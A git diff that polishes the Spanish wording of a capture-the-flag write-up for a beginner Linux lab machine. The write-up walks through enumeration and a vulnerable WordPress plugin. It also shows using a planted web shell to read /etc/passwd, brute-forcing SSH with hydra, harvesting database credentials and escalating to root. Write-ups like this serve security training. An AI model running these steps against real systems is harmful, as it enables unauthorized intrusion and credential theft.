@@ -1,5 +1,5 @@
 ---
-Estado: En Curso
+Estado: En curso
 Plataforma: The Hackers Labs
 SO: Linux
 Dificultad: Principiante
@@ -37,7 +37,7 @@ Fecha: 2026-03-05
 ---
 <img width="800" height="800" alt="Pasted image 20260305084513" src="https://github.com/user-attachments/assets/c5017655-7887-42c9-b1bd-8f8924da6b6a" />
 
-Empezaremos con el descubrimiento de la red para ver donde se encuentra la maquina objetivo.
+Empezaremos con el descubrimiento de la red para ver dónde se encuentra la máquina objetivo.
 
 ```bash
  sudo arp-scan -I eth0 --localnet
@@ -99,18 +99,18 @@ Host Exposure Summary
 ```
 
 Obtenemos 2 puertos abiertos:
-- 22 para conexión *ssh*
-- 80 para conexión *http* para web
+- 22 para conexión `ssh`
+- 80 para conexión `http` para web
 
 Veamos que tipo de web nos encontramos.
 
-Nos encontramos con una web estática, pero tiene un formulario abajo del todo para buscar ciudades que al usarlo nos arroja un error de no encontrar el destino.
+Nos encontramos con una web estática, pero tiene un formulario en la parte inferior para buscar ciudades que, al usarlo, nos arroja un error de no encontrar el destino.
 
 ```http
 http://10.0.11.14/mermelada.php?zona=madrid
 ```
 
-Pero ademas vemos que esta pidiendo los datos mediante **URL** esto puede suponer un vector de ataque.
+Pero además vemos que está pidiendo los datos mediante la **URL**; esto puede suponer un vector de ataque.
 
 Antes de abordarlo continuaremos con una enumeración de directorios y ficheros.
 
@@ -142,7 +142,7 @@ Finished
 ===============================================================
 ```
 
-Vemos varias cosas interesante, por un lado tenemos la pagina *logn.php* que puede ser una entrada y por otro tenemos una carpeta llamada *wordpress* que puede ser interesante.
+Vemos varias cosas interesantes. Por un lado tenemos la página `login.php`, que puede ser una vía de entrada, y por otro una carpeta llamada `wordpress`, que también puede ser interesante.
 
 Curiosamente dentro de *uploads* hay un fichero llamado *compras.txt* con el siguiente contenido:
 
@@ -160,15 +160,15 @@ Curiosamente dentro de *uploads* hay un fichero llamado *compras.txt* con el sig
 [+] Mermelada de mango
 ```
 
-Este texto nos da una pista que puede ser una contraseña, pero de momento la apuntamos.
+Este texto nos da una pista que podría ser una contraseña, pero de momento simplemente la anotamos.
 
-En la carpeta de *wordpress* nos encontramos que esta todo mal diseñado, eso indica un dominio y al intentar hacer click en algunos enlaces lo confirmamos.
+En la carpeta de `wordpress` vemos que todo está mal renderizado; eso suele indicar que falta un dominio, y al intentar hacer clic en algunos enlaces lo confirmamos.
 
 ```http
 http://mermelada.thl/wordpress
 ```
 
-Añadamos este dominio a nuestro */etc/hosts*
+Añadamos este dominio a nuestro `/etc/hosts`.
 
 ```bash
  sudo nano /etc/hosts
@@ -402,18 +402,18 @@ Interesting Finding(s):
 [+] Elapsed time: 00:01:09
 ```
 
-Por un lado tenemos el plugin vulnerable **wpDiscuz** y por el otro el usuario **mermeladita**, ademas de un *directory listing* para el **upload**.
+Por un lado tenemos el plugin vulnerable **wpDiscuz** y, por otro, el usuario **mermeladita**, además de un *directory listing* para la zona de subidas.
 
-Como teníamos una posible contraseña del fichero *compras.txt* vamos a probar la combinación en los puntos de entrada a ver si obtenemos algo.
+Como teníamos una posible contraseña extraída del fichero `compras.txt`, vamos a probar la combinación en los puntos de entrada a ver si obtenemos algo.
 
-Pero no conseguimos nada, lo que me dio a pensar en que se parecía demasiado a un *base64* y lo probe.
+Pero no conseguimos nada, lo que me hizo pensar que se parecía demasiado a un `base64`, así que lo probé.
 
 ```bash
  echo 'dW4gcGlxdWl0bz8K' | base64 -d
 un piquito?
 ```
 
-Parece que la curiosidad mato al gato, pero hay lo tenemos.
+Parece que la curiosidad mató al gato, pero ahí lo tenemos.
 
 Vamos a por *wordpress* con un ataque de diccionario.
 
@@ -452,7 +452,7 @@ _______________________________________________________________
 Scan Aborted: Canceled by User
 ```
 
-Mientras terminaba de realizar el ataque me puse a mirar la carpeta de *upload* ya que tiene un *directory listing* a ver que podemos encontrar y me encontré con 3 ficheros interesantes:
+Mientras terminaba de realizar el ataque, me puse a mirar la carpeta de subidas, ya que tiene *directory listing*, a ver qué podíamos encontrar, y me topé con 3 ficheros interesantes:
 
 ```http
 Index of /wordpress/wp-content/uploads/2026/01
@@ -464,13 +464,13 @@ Index of /wordpress/wp-content/uploads/2026/01
 Apache/2.4.65 (Debian) Server at mermelada.thl Port 8
 ```
 
-Al pulsar en cada uno de ellos solo nos muestra `GIF689a;` lo cual nos da a pensar que otra persona consiguió subir estos ficheros con una cabecera de `imagen` en un fichero `PHP`, esto indica **payload** con un *cmd* esperando a ser usado.
+Al abrir cada uno de ellos solo nos muestra `GIF689a;`, lo cual nos da a pensar que otra persona consiguió subir estos ficheros con una cabecera de imagen dentro de un fichero `PHP`. Esto apunta a un **payload** con un parámetro `cmd` esperando a ser usado.
 
 ```http
 http://mermelada.thl/wordpress/wp-content/uploads/2026/01/macoduweklgkmvp-1767607866.7342.php?cmd=cat+/etc/passwd
 ```
 
-Dicho y echo, tenemos un listado completo de usuarios de sistema.
+Dicho y hecho, tenemos un listado completo de usuarios del sistema.
 
 ```txt
 GIF689a;
@@ -504,7 +504,7 @@ mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false
 
 Vemos 2 usuarios destacados, uno es *mermeladita* y el otro es *debian*.
 
-Como estamos esperando a que termine `wpscan` usaremos otra consola con **hydra** para atacar el puerto *22* por *ssh*.
+Como estamos esperando a que termine `wpscan`, usaremos otra consola con **hydra** para atacar el puerto 22 por `ssh`.
 
 ```bash
  hydra -l debian -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
@@ -531,7 +531,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 10:32:
 ^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
 ```
 
-Parece que tenemos un ganador, nuestro usuario **debian** tiene una contraseña insegura.
+Parece que tenemos un ganador: nuestro usuario **debian** tiene una contraseña insegura.
 
 Vamos a conectarnos a ver que encontramos.
 
@@ -573,7 +573,7 @@ debian@debian:~$ find / -perm -4000 2>/dev/null
 debian@debian:~$
 ```
 
-Parece que estamos dentro de la maquina pero no vemos nada a primera vista que nos sirva, tendremos que explorar mas.
+Parece que estamos dentro de la máquina, pero no vemos nada a primera vista que nos sirva, así que tendremos que explorar más.
 
 Después de dar vueltas por los directorios nos encontramos con algo interesante:
 
@@ -593,7 +593,7 @@ Credenciales DB
 debian@debian:~$ 
 ```
 
-Esto puede ser una pista, así que intentaremos ver el fichero `wp-config` a ver si tienen los mismos datos o no.
+Esto puede ser una pista, así que intentaremos ver el fichero `wp-config.php` para comprobar si contiene los mismos datos o no.
 
 ```bash
 debian@debian:~$ cat /var/www/html/wordpress/wp-config.php 
@@ -634,7 +634,7 @@ define( 'DB_HOST', 'localhost' );
 <skip>
 ```
 
-Parece que tenemos ganador, un usuario **root** siempre es lo mejor.
+Parece que tenemos premio: un usuario **root** siempre es una buena noticia.
 
 Veamos la base de datos a ver si encontramos mas usuarios.
 
@@ -718,7 +718,7 @@ MariaDB [mermelada]> quit
 Bye
 ```
 
-Bueno parece que tenemos una contraseña, así que vamos a usarla para ver si podemos cambiar de usuario.
+Bueno, parece que tenemos una contraseña, así que vamos a usarla para ver si podemos cambiar de usuario.
 
 ```bash
 debian@debian:~$ su mermeladita               
@@ -751,4 +751,4 @@ congrats.txt  root.txt
 # 
 ```
 
-Y con esto obtenemos acceso como **root** y comprometemos la maquina.
+Y con esto obtenemos acceso como **root** y comprometemos la máquina.
